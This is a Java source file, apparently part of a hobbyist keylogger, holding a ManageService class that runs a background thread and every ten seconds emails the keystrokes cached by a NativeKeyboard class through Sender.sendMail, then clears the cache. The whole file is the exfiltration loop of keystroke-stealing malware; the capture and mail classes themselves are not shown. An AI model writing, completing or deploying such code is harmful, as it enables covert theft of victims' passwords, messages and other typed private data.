package org.nick.handlers;

import org.nick.keys.NativeKeyboard;

/**
 * 
 * @author NICK
 * This class is responsible for sending the keys
 */
public class ManageService implements Runnable {

	private NativeKeyboard keyboard;
	private Thread service;
	private static final int mailInterval = 10_000;
	
	
	public ManageService() {
		keyboard = new NativeKeyboard();
		service  = new Thread(this, "Manage Service");
		service.start(); // start will invoke the run method of the thread
	}
	
	public NativeKeyboard getKeyboard() {
		return keyboard;
	}

	public void setKeyboard(NativeKeyboard keyboard) {
		this.keyboard = keyboard;
	}

	//this is in order to set a time period within an email should be sent tha ta grapseis pote swsta?
	@Override
	public void run() {
		long start = System.nanoTime();
		while(true) {
			long elapsed = (System.nanoTime() - start) / 1_000_000;
			if(elapsed > mailInterval) {
				try {
/*					Sender.sendMail(Utils.rawPrint(keyboard.getKeyCache()));*///this is a text this is a text
					Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
					keyboard.onSend();
				} catch (Throwable e) {
					e.printStackTrace();
					keyboard.onFail();
				}
				
				start = System.nanoTime();
			}
		}
		
	}
}
